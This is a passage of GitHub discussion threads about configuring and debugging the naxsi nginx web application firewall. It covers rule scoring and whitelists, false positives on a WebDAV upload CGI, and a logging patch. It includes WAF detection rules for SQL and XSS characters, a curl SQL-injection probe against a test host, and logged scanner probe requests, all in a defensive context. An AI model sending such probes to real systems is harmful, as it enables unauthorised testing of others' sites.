\"$RFI >= 8\" BLOCK;\n        CheckRule \"$TRAVERSAL >= 4\" BLOCK;\n        CheckRule \"$EVADE >= 4\" BLOCK;\n        CheckRule \"$XSS >= 8\" BLOCK;\n        CheckRule \"$UPLOAD >= 8\" BLOCK;\n\n        proxy_pass http://local_upstream;\n        proxy_set_header Host $host;\n    }\n    location /RequestDenied {\n        return 403;\n    }\n}\n\n}\n```\nand \ncurl -x ip:port http:/www.test.com/?id='\ndidn't be blocked.\n. In naxsi_core.rules, I find this:\nMainRule \"str:\\\"\" \"msg:double quote\" \"mz:BODY|URL|ARGS|$HEADERS_VAR:Cookie\" \"s:$SQL:8,$XSS:8\" id:1001;\nThis means we just check a specific Cookie's value. But what I want to do is check all of the values without all of the name. like \nMainRule \"str:\\\"\" \"msg:double quote\" \"mz:BODY|URL|ARGS|$HEADERS_VAR\" \"s:$SQL:8,$XSS:8\" id:1001;\nThx..\n. ",
    "adriandf": "Hi,\nYes you are right works with BasicRule wl:1003,1004,1015.\nMaybe it did not work because I was adding the rules one by one for same URL (looked like 1003 was matched but not rest)?\nlike\nBasicRule wl:1003\nBasicRule wl:1004\nBasicRule wl:1015\nWe have a complex app including webdav and custom webdav clients, so maybe I got lost a little through rules. :)\nThanks,\nAdrian\n. I tried with the rules one by one and it stops working :)\nBasicRule wl:1003 \"mz:$URL_X:^/api/\\*/gettoken/|URL\";\nBasicRule wl:1004 \"mz:$URL_X:^/api/\\*/gettoken/|URL\";\nBasicRule wl:1015 \"mz:$URL_X:^/api/\\*/gettoken/|URL\";\n2013/11/22 05:31:46 [error] 3603#0: *5 NAXSI_FMT: ip=x.x.x.x&server=my.site.com&uri=/api/*/gettoken/&learning=1&vers=0.53-1&total_processed=3&total_blocked=2&block=1&cscore0=$SQL&score0=8&zone0=URL&id0=1004&var_name0=, client:x.x.x.x, server: *.site.com, request: \"GET /api/*/gettoken/ HTTP/1.1\", host: \"my.site.com\"\n. Seems to be something with the * . I have other rules one by one like below and they work fine.\nBasicRule wl:1002 \"mz:$URL_X:^/api/[a-z0-9]+/doInitUpload/[A-Za-z0-9]+.*$|URL\";\nBasicRule wl:1015 \"mz:$URL_X:^/api/[a-z0-9]+/doInitUpload/[A-Za-z0-9]+.*$|URL\";\nor\nBasicRule wl:1000 \"mz:$URL_X:^/api/[a-z0-9]+/checkPathExists/[A-Za-z0-9]+.*$|URL\";\nBasicRule wl:1015 \"mz:$URL_X:^/api/[a-z0-9]+/checkPathExists/[A-Za-z0-9]+.*$|URL\";\n. btw, really great stuff with the regex implementation, very very helpful with dynamic apps. :)\n. Works like a treat. :)\nThanks.\n. Hi,\nin short yes, block say \\x00 type JavaScript encoding. Could have some \"uses\":\nhttps://blog.whitehatsec.com/hash-length-extension-attacks/ crypto attack\nhttp://blog.spiderlabs.com/2012/08/stripe-ctf-walkthrough.html -> Level 7 challenge, crypto attack\nhttp://www.exploit-db.com/exploits/22100/ for XSS\nor even SQLi.\nThanks,\nAdrian\n. in our logs we see quite some number of requests using \\x00 requests so we did add a block. :)\n. we used to have a \"generator\" for docs downloads on a site that appended a hmac value to download URL. We noticed on that attacks similar to the ones listed in the whitehat blog.\nThese days we notice weird request like (it's always in this combo from various IPs). Not sure what they mean with the first request (does not have a HTTP method, nginx issues a 400). Second seems to be for a d-link router vuln.\n66.206.56.178 - - [25/Nov/2013:13:25:21 -0500] \"\\x80w\\x01\\x03\\x01\\x00N\\x00\\x00\\x00 \\x00\\x009\\x00\\x008\\x00\\x005\\x00\\x00\\x16\\x00\\x00\\x13\\x00\\x00\" 400 166 \"-\" \"-\"\n66.206.56.178 - admin [25/Nov/2013:13:25:21 -0500] \"GET /HNAP1/ HTTP/1.1\" 302 154 \"http://my_server_ip\" \"Mozilla/2.0 (compatible; MSIE 3.0B; Win32)\"\nPersonal I like to block all junk/weird stuff from reaching the app and log that.\n. changed the rules to:\nBasicRule wl:13 \"mz:$URL_X:^/cgi-bin/uploader/uploader1\\.cgi$|BODY\";\nBasicRule wl:1015 \"mz:$URL_X:^/cgi-bin/uploader/uploader1\\.cgi$|ARGS\";\nBasicRule wl:2 \"mz:$URL_X:^/cgi-bin/uploader/uploader1\\.cgi$|BODY\";\nsame block:\n```\n2013/11/25 18:16:18 [error] 3959#0: 86 NAXSI_FMT: ip=client_ip&server=my.site.com&uri=/cgi-bin/uploader/uploader1.cgi&learning=1&vers=0.53-1&total_processed=16&total_blocked=1&block=1, client: client_ip, server: .mysite.com, request: \"POST /cgi-bin/uploader/uploader1.cgi?562fa24b7c5d1c1b3f46992e5318cd31,0,0 HTTP/1.1\", host: \"my.site.com\"\n```\n. this is what a request that triggers naxsi block looks like:\n```\nPOST /cgi-bin/uploader/uploader1.cgi?a24679bfae64cd5ca6b0b123f9dacf31,0,0 HTTP/1.1\nContent-Type: multipart/form-data; boundary=---------------------------7d83d83704a8\nAccept-Encoding: gzip, deflate\nUser-Agent: custom-agent\nConnection: Keep-Alive\nCache-Control: no-cache;\nHost: my.site.com\nContent-Length: 1024\n-----------------------------7d83d83704a8\nContent-Disposition: form-data; name=\"file_1\"; filename=\"D:\\hosts\"\nCopyright (c) 1993-2009 Microsoft Corp.\n\nThis is a sample HOSTS file used by Microsoft TCP/IP for Windows.\n\nThis file contains the mappings of IP addresses to host names. Each\nentry should be kept on an individual line. The IP address should\nbe placed in the first column followed by the corresponding host name.\nThe IP address and the host name should be separated by at least one\nspace.\n\nAdditionally, comments (such as these) may be inserted on individual\nlines or following the machine name denoted by a '#' symbol.\n\nFor example:\n\n102.54.94.97     rhino.acme.com          # source server\n38.25.63.10     x.acme.com              # x client host\nlocalhost name resolution is handled within DNS itself.\n127.0.0.1       localhost\n::1             localhost\n1.1.1.1        something.changed.com\n-----------------------------7d83d83704a8--\nHTTP/1.1 200 OK\nServer: nginx\nDate: Tue, 26 Nov 2013 16:35:32 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: keep-alive\nVary: Accept-Encoding\nX-Frame-Options: SAMEORIGIN\nStrict-Transport-Security: max-age=3456000\nContent-Length: 145\nxml version=\"1.0\"  encoding=\"utf-8\"?\n\n864\nuploader\ny\n\n```\n. closed the issue accidentally :)\nbasically above I uploaded a hosts file using the app and the custom webdav client\n. Hi,\n\nUnfortunately this is a commercial closed source app. We don't have access to source code (delivered as appliance).\nTo make it worst, it only happens when using their custom webdav client. This calls that cgi.\nI could only capture the request using fiddler (having the wedavclient use fiddler as proxy).\nNot sure from where to collect additional info.\nThanks,\nAdrian\n. what are the contact details for consultancy?\nI will need to take that up 2 management :)\nin the mean time i tried a wl:0 exclusion for that URL. I added the following rules:\nBasicRule wl:0 \"mz:$URL_X:^/cgi-bin/uploader/uploader1\\.cgi$|ARGS\";\nBasicRule wl:0 \"mz:$URL_X:^/cgi-bin/uploader/uploader1\\.cgi$|BODY\";\nBasicRule wl:0 \"mz:$URL_X:^/cgi-bin/uploader/uploader1\\.cgi$|URL\";\nBasicRule wl:0 \"mz:$URL_X:^/cgi-bin/uploader/uploader1\\.cgi$|HEADERS\";\nBasicRule wl:0 \"mz:$URL_X:^/cgi-bin/uploader/uploader1\\.cgi$|FILE_EXT\";\nIs there any way to disable naxsi completely for an URL ?\nThanks,\nAdrian\n. not sure I understand what you mean by \"you tried to combine \"classic\" match zones with \"regex\" match zones\" ?\nI used URL_X in BODY/ARGS zones ?\n. np :)\nyour help is very much appreciated.\ni tried a \"global\":\nBasicRule wl:0;\nstill naxsi blocked (in learning mode) the request without giving a reason.\n. with curl I cannot trigger the block (if I whitelist rule 14 BODY too). Only the custom webdav client seems able to trigger it. i'm playing with fiddler and replaying the POST This replay is able to trigger the naxsi block. trying to figure what looks weird at that request. \ncurl -X POST -H \"Content-Type: multipart/form-data; boundary=---------------------------7d83d83704a8\" --data-binary @test.txt https://my.site.com/cgi-bin/uploader/uploader1.cgi?a43542afad63cf5ce6e0b559f8ceba37,0,0\n. fiddler provided its own curl. after whitelisting rule 11/body no block for curl, still webdav client gets blocked. fiddler's curl is:\ncurl -k -i --raw -o 0.dat -X POST \"https://my.site.com/cgi-bin/uploader/uploader1.cgi?31ab0d1a32bb36747b4577a221c257f2,0,0\" -H \"Content-Type: multipart/form-data; boundary=---------------------------7d83d83704a8\" -H \"Accept-Encoding: gzip, deflate\" -H \"User-Agent: Custom.Win\" -H \"Connection: Keep-Alive\" -H \"Cache-Control: no-cache;\" -H \"Host: my.site.com\"\nwhere 0.dat file is:\n```\n-----------------------------7d83d83704a8\nContent-Disposition: form-data; name=\"file_1\"; filename=\"D:\\hosts\"\nCopyright (c) 1993-2009 Microsoft Corp.\n\nThis is a sample HOSTS file used by Microsoft TCP/IP for Windows.\n\nThis file contains the mappings of IP addresses to host names. Each\nentry should be kept on an individual line. The IP address should\nbe placed in the first column followed by the corresponding host name.\nThe IP address and the host name should be separated by at least one\nspace.\n\nAdditionally, comments (such as these) may be inserted on individual\nlines or following the machine name denoted by a '#' symbol.\n\nFor example:\n\n102.54.94.97     rhino.acme.com          # source server\n38.25.63.10     x.acme.com              # x client host\nlocalhost name resolution is handled within DNS itself.\n127.0.0.1       localhost\n::1             localhost\n-----------------------------7d83d83704a8--\n```\n. could be :)\nthe weird part is that I see now that the browser based interface calls the same cgi. but naxsi allows through this request.\nlooking at the request I see the browser adds a \"Content-Type: text/plain\", but anyway curl \"replays\" fine the other request without that.\n```\nPOST https://my.site.com.com/cgi-bin/uploader/uploader1.cgi?923df4b7196435b0d84e517482c2cccb HTTP/1.1\nAccept: text/html, application/xhtml+xml, /\nReferer: https://my.site.com/filemanager/\nAccept-Language: en-US\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)\nContent-Type: multipart/form-data; boundary=---------------------------7dda82050902\nAccept-Encoding: gzip, deflate\nHost: my.site.com\nContent-Length: 1007\nDNT: 1\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: fdgfdgfdg\n-----------------------------7dda82050902\nContent-Disposition: form-data; name=\"file_1\"; filename=\"hosts\"\nContent-Type: text/plain\nCopyright (c) 1993-2009 Microsoft Corp.\n\nThis is a sample HOSTS file used by Microsoft TCP/IP for Windows.\n\nThis file contains the mappings of IP addresses to host names. Each\nentry should be kept on an individual line. The IP address should\nbe placed in the first column followed by the corresponding host name.\nThe IP address and the host name should be separated by at least one\nspace.\n\nAdditionally, comments (such as these) may be inserted on individual\nlines or following the machine name denoted by a '#' symbol.\n\nFor example:\n\n102.54.94.97     rhino.acme.com          # source server\n38.25.63.10     x.acme.com              # x client host\nlocalhost name resolution is handled within DNS itself.\n127.0.0.1       localhost\n::1             localhost\n-----------------------------7dda82050902--\n```\n.  I've added a diff location in nginx for that URL without naxsi.\n. Hi,\nThe browser works fine with the above request. The text/plain content type is added after content-disposition.\n-----------------------------7dda82050902\nContent-Disposition: form-data; name=\"file_1\"; filename=\"hosts\"\nContent-Type: text/plain\n...\nOn the client except installing it and setting proxy settings and app settings i cannot change anything. :)\nThanks,\nAdrian\n. ",
    "nzin": "Hello Thibault,\nGood idea, i will check that, and come back to you.\nOn Wed, Dec 11, 2013 at 5:03 AM, Thibault Koechlin <notifications@github.com\n\nwrote:\nHi,\nfirst of all, thank you for your contribution and for this patch :)\nI do think indeed the patch is a good idea.\nHowever, regarding default log files, I'd prefer the following approach :\n- if no naxsi_logfile keyword is defined, it logs into existing\n  error_log\n- if naxsi_logfile is defined in configuration, it specifies\n  destination log file\nThis approach allows to keep backward compatibility for existing setups\n(which is crucial in a production context), and avoid hard coded log files\npaths.\nUnfortunately I'll be a bit busy for the coming weeks, so I'm afraid I\nwon't have much time to play around that.\nIn the meanwhile, if you can have a look at the possibility to implement\nsuch a solution, it would make things easier.\nIn both cases, I'll try to get back to you asap !\nCheers,\n\u2014\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-30307681\n.\n. Ok,\n\nI merge your suggestions: if no naxsi_log is provided in the configuration\nfile, it will go to nginx error.\nAnd I also fix some bugs (related to merge_loc functions I better\nunderstand now).\nI have done a bit more tests (with \"ab\"), but still when you time to pass\nover, that will be usefull I think.\nRegards,\nNicolas\nOn Wed, Dec 11, 2013 at 5:03 AM, Thibault Koechlin <notifications@github.com\n\nwrote:\nHi,\nfirst of all, thank you for your contribution and for this patch :)\nI do think indeed the patch is a good idea.\nHowever, regarding default log files, I'd prefer the following approach :\n- if no naxsi_logfile keyword is defined, it logs into existing\n  error_log\n- if naxsi_logfile is defined in configuration, it specifies\n  destination log file\nThis approach allows to keep backward compatibility for existing setups\n(which is crucial in a production context), and avoid hard coded log files\npaths.\nUnfortunately I'll be a bit busy for the coming weeks, so I'm afraid I\nwon't have much time to play around that.\nIn the meanwhile, if you can have a look at the possibility to implement\nsuch a solution, it would make things easier.\nIn both cases, I'll try to get back to you asap !\nCheers,\n\u2014\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-30307681\n.\n. I'm looking forward.\n\n(and if you are french, we can switch to french)\nOn Thu, Jan 23, 2014 at 11:22 AM, buixor notifications@github.com wrote:\n\nHi,\nI should have some time to look at it this week-end, I'll keep you posted !\n\u2014\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-33139671\n.\n. Hello,\n\nsorry for the delay.\n- no pb to stick to english.\n- I updated my repo, and separate log function into a specific C file.\n- I will try to make unit tests working and based on that see if I can\n  build relevant tests cases.\nthanks\nOn Sat, Jan 25, 2014 at 8:47 AM, buixor notifications@github.com wrote:\n\nHi Nicolas,\nYes I'm french, however, if you're ok, I'd prefer we stick to english.\nI started reading the patch more in detail, but as I'm not very familiar\nwith nginx's logging system, and I will need some extra time. However, I\nhave already a few suggestions :\n- move code to a separate c file ? just for clarity\n- would you mind creating unit tests ?\nRegarding unit tests (see\nhttp://search.cpan.org/~agent/Test-Nginx-0.22/lib/Test/Nginx/Socket.pm)\nthere is already a lot of them in the directory t/ in the repo.\nNaxsi's Makefile somehow supports building with libgcov. \"make test\" will\nrun unit tests and produce a html report of code % covered by unit tests,\nyou should aim for enough tests to cover most easily reproducible corner\ncases.\ncheers,\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-33289279\n.\n. Hi,\n\nI tried to add test unit. In fact I put 3 tests (and they are on github in\nthe t/21log.t file). But I'm not satisfied with them:\n- I didn't manage to add a\n  \"no_error_loghttps://metacpan.org/pod/Test::Nginx::Socket#no_error_log\n  \"\n- I wanted to test content inside the logs/naxsi.log, but I don't manage to\n  find how\nI guess you are more familiar than me with Test::Base and\nTest::Nginx::Socket. Do you have any clues how to add these 2 assertions?\nRegards,\nNicolas\nOn Wed, Feb 12, 2014 at 7:02 AM, buixor notifications@github.com wrote:\n\nHi Nicolas,\nThat's nice ! Looking forward to this ;)\ncheers,\nOn Tue, Feb 11, 2014 at 9:19 PM, Nicolas Zin <notifications@github.com\n\nwrote:\nHello,\nsorry for the delay.\n- no pb to stick to english.\n- I updated my repo, and separate log function into a specific C file.\n- I will try to make unit tests working and based on that see if I can\n  build relevant tests cases.\nthanks\nOn Sat, Jan 25, 2014 at 8:47 AM, buixor notifications@github.com\nwrote:\n\nHi Nicolas,\nYes I'm french, however, if you're ok, I'd prefer we stick to english.\nI started reading the patch more in detail, but as I'm not very\nfamiliar\nwith nginx's logging system, and I will need some extra time. However,\nI\nhave already a few suggestions :\n- move code to a separate c file ? just for clarity\n- would you mind creating unit tests ?\nRegarding unit tests (see\nhttp://search.cpan.org/~agent/Test-Nginx-0.22/lib/Test/Nginx/Socket.pm\n)\nthere is already a lot of them in the directory t/ in the repo.\nNaxsi's Makefile somehow supports building with libgcov. \"make test\"\nwill\nrun unit tests and produce a html report of code % covered by unit\ntests,\nyou should aim for enough tests to cover most easily reproducible\ncorner\ncases.\ncheers,\n\nReply to this email directly or view it on GitHub<\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-33289279>\n.\n\n\nReply to this email directly or view it on GitHub<\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-34801046>\n.\n\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-34862373\n.\n. Hello Thibault,\n\ndid you got time to check if you are confortable with my last commits?\nRegards,\nOn Wed, Feb 12, 2014 at 11:34 AM, Nicolas Zin nicolas.zin@gmail.com wrote:\n\nHi,\nI tried to add test unit. In fact I put 3 tests (and they are on github in\nthe t/21log.t file). But I'm not satisfied with them:\n- I didn't manage to add a \"no_error_loghttps://metacpan.org/pod/Test::Nginx::Socket#no_error_log\n  \"\n- I wanted to test content inside the logs/naxsi.log, but I don't manage\n  to find how\nI guess you are more familiar than me with Test::Base and\nTest::Nginx::Socket. Do you have any clues how to add these 2 assertions?\nRegards,\nNicolas\nOn Wed, Feb 12, 2014 at 7:02 AM, buixor notifications@github.com wrote:\n\nHi Nicolas,\nThat's nice ! Looking forward to this ;)\ncheers,\nOn Tue, Feb 11, 2014 at 9:19 PM, Nicolas Zin <notifications@github.com\n\nwrote:\nHello,\nsorry for the delay.\n- no pb to stick to english.\n- I updated my repo, and separate log function into a specific C file.\n- I will try to make unit tests working and based on that see if I can\n  build relevant tests cases.\nthanks\nOn Sat, Jan 25, 2014 at 8:47 AM, buixor notifications@github.com\nwrote:\n\nHi Nicolas,\nYes I'm french, however, if you're ok, I'd prefer we stick to english.\nI started reading the patch more in detail, but as I'm not very\nfamiliar\nwith nginx's logging system, and I will need some extra time.\nHowever, I\nhave already a few suggestions :\n- move code to a separate c file ? just for clarity\n- would you mind creating unit tests ?\nRegarding unit tests (see\nhttp://search.cpan.org/~agent/Test-Nginx-0.22/lib/Test/Nginx/Socket.pm)\nthere is already a lot of them in the directory t/ in the repo.\nNaxsi's Makefile somehow supports building with libgcov. \"make test\"\nwill\nrun unit tests and produce a html report of code % covered by unit\ntests,\nyou should aim for enough tests to cover most easily reproducible\ncorner\ncases.\ncheers,\n\nReply to this email directly or view it on GitHub<\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-33289279>\n.\n\n\nReply to this email directly or view it on GitHub<\nhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-34801046>\n.\n\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-34862373\n.\n. I don't use it yet in production,\n\n\nI was waiting to be in sync with official repo, but I will try to use it\nanyway, that could be a further step.\nI will let you know.\nOn Thu, Mar 20, 2014 at 6:42 AM, buixor notifications@github.com wrote:\n\nHi,\nI'm totally to blame here, Nicolas did a great job, but I just didn't find\ntime to test it enough to feel confident merging it. Nicolas, do you use it\nin production yet ?\nFeedback would really help here, as I don't feel confident enough in my\nknowledge of nginx's logging internals to judge the stability of this code\n...\nI think I will merge it anyway, just a bit afraid of potential backfire ;p\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-38153311\n.\n. Hi guys,\n\njust for information, I work today on the naxsi log extension, to:\n- use \"naxsi_log\" (instead of \"naxsi_logfile\")\n- and be able to setup on the main section (and not, only, in the location\n  section)\nSo far so good, I also update my ppa if you want to test it:\nhttps://launchpad.net/~nicolas-zin/+archive/nginx\nand tested it on a real website, but just for 5 minutes. (to check if it\nruns correctly, and see if nx_util works)\nand tomorrow I will let it run more than 10 minutes on a real website.\nI also tested it via \"ab\" and didn't see any memory leak, which is a good\nstart :-)\nRegards,\nNicolas Zin\nOn Wed, Mar 19, 2014 at 2:32 PM, binaryanomaly notifications@github.comwrote:\n\nI would really love to see that feature as part of naxsi. Good job!\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-38089298\n.\n. Oh!\n\nweird:\nstatic must not be here, I had this bug and I corrected it, but didn't\nchanged it into skeleton.c, and my gcc didn't complain!\nI push the change.\ntry again please\nOn Mon, Mar 24, 2014 at 7:13 PM, binaryanomaly notifications@github.comwrote:\n\nI could actually test it a bit.\nCloned https://github.com/nzin/naxsi and tried to build it together with\nnginx which ends up in an error?\ncc -c -pipe -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g\n-g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat\n-Werror=format-security -D_FORTIFY_SOURCE=2 -I src/core -I src/event -I\nsrc/event/modules -I src/os/unix -I objs -I src/http -I src/http/modules -I\nsrc/mail \\\n-o objs/addon/naxsi_src/naxsi_skeleton.o \\\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_skeleton.c\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_skeleton.c:58:15: error:\n'ngx_http_naxsi_logfile_main_conf' used but never defined [-Werror]\nstatic char\n_ngx_http_naxsi_logfile_main_conf(ngx_conf_t cf, ^ cc1: all warnings being\ntreated as errors make[1]: _ [objs/addon/naxsi_src/naxsi_skeleton.o]\nError 1\nmake[1]: Leaving directory `/opt/nginx-1.5.12'\nmake: ** [build] Error 2\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-38513300\n.\n. Yes,\n\nby default, if you don't do anything the behaviour is the same as before:\nit logs on error.\nIf you want to change this behaviour, you have to add a \"naxsi_log \"\n(path can be for example /var/log/nginx/nasi.log) either in the http\nsection, or in each a location section:\n- if there is a naxsi_log in a location, I use it.\n- if there isn't in a location, but in main section, I switch to the main\n- else I log on error\nOn Tue, Mar 25, 2014 at 3:15 AM, binaryanomaly notifications@github.comwrote:\n\nIt builds and runs. Seems to still log to error.log though. Anything I\nneed to configure?\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-38536431\n.\n. thanks for the feedback. I will investigate\n\nOn Tue, Mar 25, 2014 at 10:59 AM, binaryanomaly notifications@github.comwrote:\n\nOk I changed the config and it did work during my intial tests :)\n3 hours later now naxsi is not logging anything anymore to my naxsi.log or\nerror.log (I see that naxsi still fires in the access.log though as there\nare 403s for strings covered by naxsi rules)\nRestarting the nginx service fixed it, so I assume something is not quite\nright yet?\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-38574372\n.\n. By any chance, do you know, if it was not working after a logrotate? or a\nworker recycled?\n\nOn Tue, Mar 25, 2014 at 10:59 AM, binaryanomaly notifications@github.comwrote:\n\nOk I changed the config and it did work during my intial tests :)\n3 hours later now naxsi is not logging anything anymore to my naxsi.log or\nerror.log (I see that naxsi still fires in the access.log though as there\nare 403s for strings covered by naxsi rules)\nRestarting the nginx service fixed it, so I assume something is not quite\nright yet?\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-38574372\n.\n. if you track the pid of the workers. But I don't think you have this\ninformation.\nI'm trying to reproduce it (killing workers and try to see if the logs\nstill works :-) ). but don't reproduce it.\n\nI think I got the same issue as yours yesterday but took it for a\nmisconfiguration from my part, and restarted nginx without afterthough. Do\nyou have traffic? or I just has to wait for 2/3 hours?\ndo you put the naxsi_log in the main or in a location?\nthanks anyway.\nOn Tue, Mar 25, 2014 at 11:27 AM, binaryanomaly notifications@github.comwrote:\n\nThere was no logrotate, how would I check for the latter?\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-38578180\n.\n. also. next time it doesn't work, can you check with lsof if the log files\nare still opened (by all workers), (and have the same inode).\n\nOn Tue, Mar 25, 2014 at 11:41 AM, binaryanomaly notifications@github.comwrote:\n\nok I see.\nI have it in location. The malware bots seem to be lazy today so not much\ntraffic besides my own faked attempts ;)\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-38580115\n.\n. Hi,\n\njust to let you know I think I found the problem: deallocation of a pointer\n(an ngx_array) was missing.\nI put in on our corporate webserver, and get same result as you, except it\ntook me more than 3 hours. You should have some traffic on yours :-)\nRegards,\nNicolas\nOn Tue, Mar 25, 2014 at 1:06 PM, binaryanomaly notifications@github.comwrote:\n\nHappened again. Does this help:\nnginx 21111 root 12w REG 253,0 3516 408635 /var/log/nginx/naxsi.log\nnginx 21113 www-data 12w REG 253,0 3516 408635 /var/log/nginx/naxsi.log\nnginx 21114 www-data 12w REG 253,0 3516 408635 /var/log/nginx/naxsi.log\nnginx 21115 www-data 12w REG 253,0 3516 408635 /var/log/nginx/naxsi.log\nnginx 21116 www-data 12w REG 253,0 3516 408635 /var/log/nginx/naxsi.log\nroot 21111 0.0 0.2 44520 1348 ? Ss 15:56 0:00 nginx: master process\n/usr/sbin/nginx\nwww-data 21113 0.0 0.6 44664 3476 ? S 15:56 0:00 _ nginx: worker process\nwww-data 21114 0.0 0.7 45180 3996 ? S 15:56 0:01 _ nginx: worker process\nwww-data 21115 0.0 0.7 45212 3744 ? S 15:56 0:01 _ nginx: worker process\nwww-data 21116 0.0 0.6 44520 3228 ? S 15:56 0:00 _ nginx: worker process\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-38592063\n.\n. You can give a try,\n\nnot sure if it fix your problem, but at least I fixed a bug. But more I\nthink about your behaviour less I think I manage to reproduce it.\nNevertheless, on my side, I run the code for the whole night on our\ncorporate webserver (which has some traffic on it), and it works without\nproblem. (i.e. I have 3600 lines in my naxsi.log and it continues to\ngrowth).\nI have updated my ppa also (version ubuntu4, which should appears in ~2\nhours)\nOn Thu, Mar 27, 2014 at 3:20 AM, binaryanomaly notifications@github.comwrote:\n\nOk glad to hear. Let me know once you have a version on github that is\nworth testing again.\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-38775080\n.\n. Hi,\n\nfor information, after 2 days on our corporate server,\n- I generated 5200 lines in naxsi_log,\n- naxsi continues to append data to it\n- nginx process don't increase in memory (i.e. don't think I have memory\n  leak)\nDo you have the chance to test it on your side?\nNicolas\nOn Thu, Mar 27, 2014 at 8:29 AM, Nicolas Zin nicolas.zin@gmail.com wrote:\n\nYou can give a try,\nnot sure if it fix your problem, but at least I fixed a bug. But more I\nthink about your behaviour less I think I manage to reproduce it.\nNevertheless, on my side, I run the code for the whole night on our\ncorporate webserver (which has some traffic on it), and it works without\nproblem. (i.e. I have 3600 lines in my naxsi.log and it continues to\ngrowth).\nI have updated my ppa also (version ubuntu4, which should appears in ~2\nhours)\nOn Thu, Mar 27, 2014 at 3:20 AM, binaryanomaly notifications@github.comwrote:\n\nOk glad to hear. Let me know once you have a version on github that is\nworth testing again.\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-38775080\n.\n. can you send me your config files?\n\n\nBy the way log are here to log especially in learning mode. Don't remember\nif it logs when it block access.\nOn Sat, Mar 29, 2014 at 8:37 AM, binaryanomaly notifications@github.comwrote:\n\nWell I can't make it work anymore since the last update?\nWhen I define naxsi_log /var/log/nginx/naxsi.log in http or location it\njust doesn't log anything\nAlso nothing in the error.log just doesn't log naxsi actions at all. Naxsi\nworks as it's blocking access and I can see that in access.log. Any ideas?\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-38994397\n.\n. Hi Reto,\n\nplease find in attachment a replacement for naxsi_log.c\nIt add debug information that will be put into /tmp/debug\nBasically what this debug file print:\n- each time an http call is performed (no sure if it is on the location or\n  on the whole server), a line with \"naxsi_http_log_handler()\". Indeed it\n  means that nginx process request in different phase, and the last phase is\n  to treat logs. So I print this line when it appends\n- sometimes there are logs to append (to /var/log/nginx/naxsi.log), and it\n  that case you should see more line in the debug AND you should see the\n  naxsi log also append to the /var/log/nginx/naxsi.log\nIf it doesn't finish in the /var/log/nginx/naxsi.log but you see it in the\n/tmp/debug, it means that nginx workers wasn't able to write it (I guess),\nif you don't see it anywhere, the problem is more upstreaming in my log\nprocessing.\nTo sum-up: try to recompile, clean naxsi log, run it and after a while send\nme the naxsi log, and the /tmp/debug.\nThank for your help!\nNicolas\nOn Mon, Mar 31, 2014 at 12:39 PM, buixor notifications@github.com wrote:\n\nHi,\nThanks for the ongoing testing.\nTo answer Nicolas's last question, I would say naxsi will log block access\n(NAXSI_FMT) at the same place, as it's the same function that's used.\ncheers,\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39110609\n.\n. Euh?!?\nI re-attach naxsi_log.c and below the same but in 